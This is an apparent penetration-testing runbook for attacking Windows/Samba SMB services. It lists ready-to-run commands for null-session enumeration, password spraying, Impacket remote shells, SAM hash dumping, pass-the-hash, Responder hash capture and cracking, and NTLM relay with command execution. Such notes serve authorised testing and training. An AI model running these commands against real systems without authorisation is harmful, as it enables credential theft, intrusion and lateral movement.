# Attacking SMB – Quick Runbook

---

## Service Info
- SMB ports:
  - **445/tcp** = SMB over TCP (modern Windows)
  - **139/tcp** = SMB over NetBIOS (legacy / fallback)
- Linux/Unix SMB implementation = **Samba**
- Related: **MSRPC over SMB** (named pipes)

---

## 1) Quick Recon / Enumeration

### Nmap
```bash
nmap -sC -sV -p139,445 <IP>
````

Useful extra scripts:

```bash
nmap -p445 --script "smb2-security-mode,smb2-time,nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users" <IP>
```

What to note:

* Hostname / domain (NetBIOS)
* SMB signing (required vs not required)
* SMB version / Samba info

---

## 2) Null Session / Anonymous Checks

### List shares (null session)

```bash
smbclient -N -L //<IP>
```

### Enumerate share permissions

```bash
smbmap -H <IP>
```

Recursive listing:

```bash
smbmap -H <IP> -r <share>
# or deeper
smbmap -H <IP> -R <share>
```

Download / upload:

```bash
smbmap -H <IP> --download "<share>\<file>"
smbmap -H <IP> --upload local.txt "<share>\remote.txt"
```

### RPC enum (null session)

```bash
rpcclient -U '%' <IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

### enum4linux-ng (fast broad enum)

```bash
enum4linux-ng.py <IP> -A -C
```

---

## 3) Auth Testing (Spray > Bruteforce)

### CrackMapExec password spray

```bash
crackmapexec smb <IP> -u users.txt -p 'Company01!' --local-auth
```

Keep going after success:

```bash
crackmapexec smb <IP> -u users.txt -p 'Company01!' --local-auth --continue-on-success
```

Domain auth (no --local-auth):

```bash
crackmapexec smb <IP> -u users.txt -p 'Company01!'
```

---

## 4) Post-Auth: Shares + Remote Exec

### List shares with creds

```bash
crackmapexec smb <IP> -u <user> -p '<pass>' --shares
```

### Impacket remote shells (admin required)

```bash
impacket-psexec <user>:'<pass>'@<IP>
impacket-smbexec <user>:'<pass>'@<IP>
impacket-atexec  <user>:'<pass>'@<IP> "whoami"
```

### CME command execution

```bash
crackmapexec smb <IP> -u <user> -p '<pass>' -x 'whoami' --exec-method smbexec
# PowerShell
crackmapexec smb <IP> -u <user> -p '<pass>' -X 'Get-ComputerInfo' --exec-method atexec
```

---

## 5) Post-Auth: Looting (Hashes, Users)

### Logged-on users (good for lateral movement)

```bash
crackmapexec smb <CIDR> -u <user> -p '<pass>' --loggedon-users
```

### Dump local SAM (admin required)

```bash
crackmapexec smb <IP> -u <user> -p '<pass>' --sam
```

---

## 6) Pass-the-Hash (PtH)

### CME PtH

```bash
crackmapexec smb <IP> -u Administrator -H <NTHASH>
```

### Impacket PtH

```bash
impacket-psexec Administrator@<IP> -hashes :<NTHASH>
```

---

## 7) Forced Auth / Hash Capture (Responder)

### Responder

```bash
sudo responder -I <iface>
```

Captured hashes:

* Stored under: `/usr/share/responder/logs/`

Crack NetNTLMv2 (hashcat mode 5600):

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 8) NTLM Relay (impacket-ntlmrelayx)

✅ Use when:

* You can coerce auth (printerbug/PetitPotam/etc)
* **SMB signing is NOT required** on target(s)

### Prep

Turn SMB off in Responder:

```bash
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
```

### Relay to a target (dump SAM by default)

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t smb://<TARGET_IP>
```

Execute a command on success:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t smb://<TARGET_IP> -c "<cmd>"
```

---

## 9) SMB File Interaction (smbclient)

### Connect to a share

```bash
smbclient //<IP>/<share> -N
# with creds:
smbclient //<IP>/<share> -U <user>
```

Commands:

```text
ls
cd <dir>
get <file>
mget *
put <file>
recurse ON
prompt OFF
```

---

## 10) Triage Checklist (Fast)

1. `nmap -sC -sV -p139,445 <IP>`
2. Null session:

   * `smbclient -N -L //<IP>`
   * `smbmap -H <IP>`
   * `rpcclient -U '%' <IP>`
3. If creds:

   * `cme smb <IP> -u users.txt -p '<pass>' --continue-on-success`
4. If admin:

   * `impacket-psexec ...` / `cme -x ...`
   * `cme --sam`
5. If no creds:

   * Responder capture / crack
   * NTLM relay (if signing not required)


